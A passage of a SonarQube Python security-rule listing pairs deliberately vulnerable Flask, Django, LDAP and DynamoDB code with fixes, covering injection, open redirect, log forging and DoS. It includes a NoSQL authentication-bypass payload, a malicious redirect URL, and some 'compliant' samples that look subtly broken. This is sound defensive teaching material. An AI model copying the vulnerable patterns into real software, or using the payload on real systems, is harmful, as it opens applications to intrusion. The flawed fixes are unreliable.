<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2">re2</a>.</p>
<p>In the compliant solution, <code>re.escape</code> escapes metacharacters and escape sequences that could have broken the initially intended
logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2078">
              pythonsecurity:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in python-ldap</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injection because untrusted data is concatenated to an LDAP query without prior sanitization
or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
import ldap

@app.route("/user")
def user():
    username =  request.args['username']

    search_filter = "(&amp;(objectClass=user)(uid="+username+"))"

    ldap_connection = ldap.initialize("ldap://localhost:389")
    user = ldap_connection.search_s("dc=example,dc=org", ldap.SCOPE_SUBTREE, search_filter) # Noncompliant

    return user[0]
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
import ldap

@app.route("/user")
def user():
    username = ldap.filter.escape_filter_chars(request.args['username'])

    search_filter = "(&amp;(objectClass=user)(uid="+username+"))"

    ldap_connection = ldap.initialize("ldap://localhost:389")
    user = ldap_connection.search_s("dc=example,dc=org", ldap.SCOPE_SUBTREE, search_filter)

    return user[0]
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul>
  <li> <code>\</code> </li>
  <li> <code>#</code> </li>
  <li> <code>+</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>,</code> </li>
  <li> <code>;</code> </li>
  <li> <code>"</code> </li>
  <li> <code>=</code> </li>
</ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul>
  <li> <code>*</code> </li>
  <li> <code>(</code> </li>
  <li> <code>)</code> </li>
  <li> <code>\</code> </li>
  <li> <code>null</code> </li>
</ul>
<p>For Python, the python-ldap library functions <a
href="https://www.python-ldap.org/en/python-ldap-3.3.0/reference/ldap-filter.html"><code>escape_filter_chars</code></a> and <a
href="https://www.python-ldap.org/en/python-ldap-3.3.0/reference/ldap-dn.html?highlight=escape_dn#ldap.dn.escape_dn_chars"><code>escape_dn_chars</code></a>
allow sanitizing these characters.</p>
<p>In the compliant solution example, the <code>escape_filter_chars</code> is used to sanitize the search filter concatenated input.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4514.txt">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4515.txt">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/90">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5146">
              pythonsecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Flask</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
from flask import Flask, redirect

app = Flask("example")

@app.route("/redirecting")
def redirecting():
    url = request.args["url"]
    return redirect(url) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
from flask import Flask, redirect, url_for

app = Flask("example")

@app.route("/redirecting")
def redirecting():
    url = request.args["url"]
    return redirect(url_for(url))
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>
  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5145">
              pythonsecurity:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in Flask</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import logging

app = Flask(__name__)

@app.route('/example')
def log():
    data = request.args["data"]
    app.logger.critical("%s", data) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import logging
import base64

app = Flask(__name__)

@app.route('/example')
def log():
    data = request.args["data"]
    if data.isalnum():
        app.logger.critical("%s", data)
    else:
        app.logger.critical("Invalid Input: %s", base64.b64encode(data.encode('UTF-8')))
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<p>Here, the example compliant code uses the <code>isalnum</code> function to ensure the untrusted data is safe. If not, it performs Base64 encoding
to protect from log injection.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5167">
              pythonsecurity:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=python%3AS5122&rule_key=python%3AS5122'>S5122</a>, <a href='/organizations/sopra-steria/rules?open=python%3AS5146&rule_key=python%3AS5146'>S5146</a>, <a href='/organizations/sopra-steria/rules?open=python%3AS6287&rule_key=python%3AS6287'>S6287</a>, <a href='/organizations/sopra-steria/rules?open=python%3AS6839&rule_key=python%3AS6839'>S6839</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<p>Flask</p>
<pre>
from flask import Response, request
from werkzeug.datastructures import Headers

@app.route('/route')
def route():
    content_type = request.args["Content-Type"]
    response = Response()
    headers = Headers()
    headers.add("Content-Type", content_type) # Noncompliant
    response.headers = headers
    return response
</pre>
<p>Django</p>
<pre>
import django.http

def route(request):
    content_type = request.GET.get("Content-Type")
    response = django.http.HttpResponse()
    response.__setitem__('Content-Type', content_type) # Noncompliant
    return response
</pre>
<h3>Compliant solution</h3>
<p>Flask</p>
<pre>
from flask import Response, request
from werkzeug.datastructures import Headers
import re

@app.route('/route')
def route():
    content_type = request.args["Content-Type"]
    allowed_content_types = r'application/(pdf|json|xml)'
    response = Response()
    headers = Headers()
    if re.match(allowed_content_types, content_type):
        headers.add("Content-Type", content_type)  # Compliant
    else:
        headers.add("Content-Type", "application/json")
    response.headers = headers
    return response
</pre>
<p>Django</p>
<pre>
import django.http
import re

def route(request):
    content_type = request.GET.get("Content-Type")
    allowed_content_types = r'application/(pdf|json|xml)'
    response = django.http.HttpResponse()
    if re.match(allowed_content_types, content_type):
        response.__setitem__('Content-Type', content_type) # Compliant
    else:
        response.__setitem__('Content-Type', "application/json")
    return response
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/index.php/HTTP_Response_Splitting">Attack Category - HTTP Response Splitting</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/113">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response
  Splitting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6776">
              pythonsecurity:S6776
            </a>
          </td>
          <td>
            <details>
              <p>Exception stack traces contain sensitive data that the application’s code should not disclose as error messages.</p>
<h2>Why is this an issue?</h2>
<p>Stack traces contain sensitive data like filenames or folder hierarchies. They can expose implementation details, including the application’s
architecture, logic, and potential vulnerabilities. Attackers can leverage these valuable insights to identify weaknesses, devise attack strategies,
and exploit vulnerabilities.</p>
<h2>How to fix it in Flask</h2>
<p>Implement proper error handling by reporting customized error messages that do not contain a detailed stack trace. Log the exception stack trace if
needed.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
@app.errorhandler(500)
def internal_server_error(error):
    error_message = traceback.format_stack()
    return render_template('error.html', error_message=error_message), 500
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
@app.errorhandler(500)
def internal_server_error(error):
    error_message = "Internal Server Error"
    logging.exception()
    return render_template('error.html', error_message=error_message), 500
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>Python Documentation - <a href="https://docs.python.org/3/library/traceback.html">traceback — Print or retrieve a stack traceback</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/209">CWE-209 - Generation of Error Message Containing Sensitive Information</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5147">
              pythonsecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>
</ul>
<h2>How to fix it in Amazon DynamoDB</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to NoSQL injection because untrusted data is concatenated to the <code>FilterExpression</code> value. This
expression determines which items within the results should be returned.</p>
<p>A malicious HTTP request containing the following query parameter values would allow an attacker to manipulate the returned data and bypass
authentication:</p>
<pre>
username=admin&amp;password=size(password) or size(password)=size(password)
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
@app.route('/login')
def login():
    dynamodb = AWS_SESSION.client('dynamodb')

    username = request.args["username"]
    password = request.args["password"]

    dynamodb.scan(
        FilterExpression= "username = " + username + " and password = " + password, # Noncompliant
        TableName="users",
        ProjectionExpression="username"
    )
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
@app.route('/login')
def login():
    dynamodb = AWS_SESSION.client('dynamodb')

    username = request.args["username"]
    password = request.args["password"]

    dynamodb.query(
        KeyConditionExpression= "username = :u",
        FilterExpression= "password = :p",
        ExpressionAttributeValues={
            ":u": { 'S': username },
            ":p": { 'S': password }
        },
        TableName="users",
        ProjectionExpression="username"
    )
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the approach to protect against injection vulnerabilities is to ensure that untrusted data cannot break out of the initially
intended logic.</p>
<p>When using DynamoDB with Boto3, the best way to do so is by using expression attributes as placeholders (<code>:placeholder</code>). It will end up
replacing the attribute with the value defined in <code>ExpressionAttributeValues</code> and prevent any alteration of the original query logic. The
compliant code example uses such an approach.</p>
<p>When possible, use the method <code>query</code> over <code>scan</code> as it disallows the <code>OR</code> operator on the
<code>KeyConditionExpression</code> attribute and therefore reduces the attack surface. It also optimizes speed and costs.</p>
<p>This logic applies both when using the <code>DynamoDB.Client</code> and the <code>DynamoDB.Table</code> class, though the syntax differs for the
latter, and the <code>ExpressionAttributeValues</code> would look like the following:</p>
<pre>
ExpressionAttributeValues={
    ":u": username,
    ":p": password
}
</pre>
<p>Although injection can occur on all the query or scan <code>Expression</code> attributes, its most severe impact occurs in the
<code>FilterExpression</code>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/943">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5334">
              pythonsecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it runs dynamic Python code based on untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request

@app.route("/")
def example():
    operation = request.args.get("operation")
    eval(f"product_{operation}()") # Noncompliant
    return "OK"
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request

@app.route("/")
def example():
    allowed = ["add", "remove", "update"]
    operation = allowed[request.args.get("operationId")]
    eval(f"product_{operation}()")

    return "OK"
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion
is to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The example compliant code uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6639">
              pythonsecurity:S6639
            </a>
          </td>
          <td>
            <details>
              <p>Memory allocation injections occur when an application computes the size of a piece of memory to be allocated from an untrusted source. In such a
case, an attacker could be able to make the application unwillingly consume an important amount of memory by enforcing a large allocation size.</p>
<h2>Why is this an issue?</h2>
<p>By repeatedly requesting a feature that consumes a lot of memory, attackers can constantly occupy an important part of an application’s hosting
server memory. Depending on the application’s deployment architecture, hosting server resources and attackers' capabilities, this can lead to an
exhaustion of the available server’s memory.</p>
<h3>What is the potential impact?</h3>
<p>A server that faces a memory exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed and
how well the hosting server configuration is hardened.</p>
<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect
the whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or
other sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>
<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where memory usage limits are in place, the
consequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on
running without perturbation. The mainly affected application will still stop working properly.</p>
<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are
business-critical.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
def example():
    limit = int(request.args.get('limit'))

    data = '#' * limit  # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
def example():
    limit = int(request.args.get('limit'))
    restricted_limit = min(10, limit)

    data = '#' * restricted_limit
</pre>
<h3>How does this work?</h3>
<h4>Enforce an upper limit</h4>
<p>When performing a memory allocation whose size depends on a user-controlled parameter, it is of prime importance to enforce an upper limit to the
size being allocated. This will prevent any overly big memory slot from being consumed by a single allocation.</p>
<p>Note that forcing an upper limit will not prevent Denial of Service attacks. When an allocation size is restricted to a reasonable amount,
attackers can still request the allocating feature multiple times until the combined allocation size becomes big enough to cause exhaustion. However,
the smaller the allowed allocation size, the higher the number of necessary requests and, thus, the higher the required resources on the attacker
side. As for most of the DoS attack vectors, a trade-off must be found to prevent most attackers from causing exhaustion while keeping a good level of
performance and usability.</p>
<p>Here, the example compliant code uses the <code>min</code> function to enforce a reasonable upper bound to the allocation size. In that case, no
more than 10 bytes can be allocated at a time.</p>
<h4>Harden the execution environment configuration</h4>
<p>As a defense in depth measure, it is advised to harden the execution environment configuration regarding memory usage. This can effectively reduce
the scope of a successful Denial of Service attack and prevent a complete outage, potentially ranging over multiple applications.</p>
<p>When running the application in a contained environment, like a Docker container, it is usually possible to limit the amount of memory provided to
the contained environment. In that case, memory exhaustion will only impact the application hosting container and not the host system.</p>
<p>When running the application directly on a physical or heavy virtualized server, memory limits can sometimes be set on the application’s associated
service account. For example, the <code>ulimit</code> mechanism of Unix based operating systems can be used for that purpose. With such a limit set
up, memory exhaustion only impacts the applications and processes owned by the related service account.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://owasp.org/www-community/attacks/Denial_of_Service">OWASP</a> - Denial of Service </li>
  <li> <a href="https://www.linux.org/docs/man8/pam_limits.html">Linux.org</a> - pam_limits - PAM module to limit resources </li>
